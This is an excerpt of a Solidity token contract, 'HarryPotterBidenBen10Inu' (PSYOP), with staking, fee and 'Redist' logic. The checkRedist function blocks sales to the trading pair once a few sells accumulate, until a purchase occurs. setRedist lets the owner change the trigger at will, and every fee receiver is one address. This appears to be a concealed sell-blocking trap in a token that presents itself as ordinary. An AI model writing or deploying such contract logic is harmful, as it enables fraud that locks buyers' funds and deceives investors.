...
contract psyop is IERC20, tokenStaking, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'HarryPotterBidenBen10Inu';
    string private constant _symbol = 'PSYOP';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 999100999 * (10 ** _decimals);
    ...
    bool public Redist = true;
    uint256 public RedistSells;
    uint256 public RedistTrigger = 3;
    bool public RedistBuyNeeded = false;
    uint256 private swapTimes;
    bool private swapping;
    uint256 private swapAmount = 3;
    uint256 private swapThreshold = ( _totalSupply * 500 ) / 100000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
    uint256 public RedistMinAmount = 1;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    mapping(address => uint256) public amountStaked;
    uint256 public totalStaked;
    stakeIntegration internal stakingContract;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal development_receiver = 0x2EE025d787E5438164A2091831d055D7fEBFcEB5; 
    address internal marketing_receiver = 0x2EE025d787E5438164A2091831d055D7fEBFcEB5;
    address internal liquidity_receiver = 0x2EE025d787E5438164A2091831d055D7fEBFcEB5;
    address internal staking_receiver = 0x2EE025d787E5438164A2091831d055D7fEBFcEB5;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        checkRedist(sender, recipient, amount);
    ...
    function checkRedist(address sender, address recipient, uint256 amount) internal {
        if(Redist && !swapping){ 
        if(recipient == pair && !isFeeExempt[sender]){RedistSells = RedistSells.add(uint256(1));}
        if(sender == pair && !isFeeExempt[recipient] && amount >= RedistMinAmount){RedistSells = uint256(0);}
        if(RedistSells > RedistTrigger){RedistBuyNeeded = true;}
        if(RedistBuyNeeded && !isFeeExempt[recipient] && !isFeeExempt[sender]){
            require(sender == pair, "ERC20: Redist purchase required"); if(amount >= RedistMinAmount){RedistSells = uint256(0); RedistBuyNeeded = false;}}}
    }

    function setRedist(bool enabled, uint256 trigger, uint256 minAmount) external onlyOwner {
        Redist = enabled; RedistTrigger = trigger; RedistMinAmount = minAmount;
    }
